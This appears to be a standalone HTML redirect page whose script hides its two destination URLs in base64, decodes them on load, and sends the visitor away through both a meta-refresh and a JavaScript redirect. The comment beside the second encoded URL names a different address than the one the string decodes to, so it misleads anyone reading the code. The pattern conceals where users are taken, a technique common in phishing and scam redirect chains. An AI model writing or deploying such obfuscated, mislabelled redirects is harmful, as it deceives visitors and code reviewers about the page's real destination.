<!DOCTYPE HTML>
<meta charset="UTF-8">

<script>
  // Base64-encoded URLs
  const metaUrlB64 = "aHR0cHM6Ly9icmlja2tlcnouY29t";       // https://brickkerz.com
  const jsUrlB64   = "aHR0cHM6Ly9kYW4wMWNyb2Z0LmdpdGh1Yi5pby9SU1ZQLw==";        // https://max.sfp.coebh (adjust as needed)

  // Decode helper (handles UTF-8 safely)
  function b64Decode(str) {
    return decodeURIComponent(escape(atob(str)));
  }

  const metaUrl = b64Decode(metaUrlB64);
  const jsUrl   = b64Decode(jsUrlB64);

  // Inject the meta refresh tag dynamically
  const meta = document.createElement('meta');
  meta.httpEquiv = 'refresh';
  meta.content = `1; url=${metaUrl}`;
  document.head.appendChild(meta);

  // JS redirect
  window.location.href = jsUrl;
</script>

<title>Page Redirection</title>
